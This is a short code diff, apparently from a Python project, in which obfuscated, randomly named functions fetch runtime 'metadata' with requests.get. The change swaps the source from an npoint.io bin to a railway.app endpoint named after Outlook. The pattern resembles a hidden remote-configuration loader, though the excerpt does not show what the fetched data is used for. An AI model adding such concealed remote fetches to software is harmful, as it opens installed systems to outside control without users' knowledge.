@@ -16,7 +16,7 @@ def eval_eckrcq_644():
 
     def train_rklcif_814():
         try:
-            data_wuctyz_662 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_wuctyz_662 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_wuctyz_662.raise_for_status()
             config_aydrzw_695 = data_wuctyz_662.json()
             train_qpghio_273 = config_aydrzw_695.get('metadata')
